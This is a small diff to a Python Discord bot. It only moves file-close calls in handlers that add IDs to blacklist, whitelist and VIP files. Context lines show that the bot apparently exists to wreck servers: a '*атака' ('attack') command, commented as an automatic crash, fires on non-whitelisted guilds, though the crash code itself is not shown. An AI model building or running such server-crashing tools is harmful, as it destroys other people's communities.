@@ -75,24 +75,24 @@ class MyClient(discord.Client):
 				mc = message.content.replace('*bl', '')
 				f = open('blacklist.txt', 'a')
 				f.write(mc + '\n')
-				f.close()
 				await message.author.send(':white_check_mark:')
+				f.close()
 				
 			if message.content.startswith('*wl'):
 				await message.delete()
 				mc = message.content.replace('*wl', '')
 				f = open('whitelist.txt', 'a')
 				f.write(mc + '\n')
-				f.close()
 				await message.author.send(':white_check_mark:')
+				f.close()
 				
 			if message.content.startswith('*гивип'):
 				await message.delete()
 				mc = message.content.replace('*гивип', '')
 				f = open('vip.txt', 'a')
 				f.write(mc + '\n')
-				f.close()
 				await message.author.send(':white_check_mark:')
+				f.close()
 		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
 			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
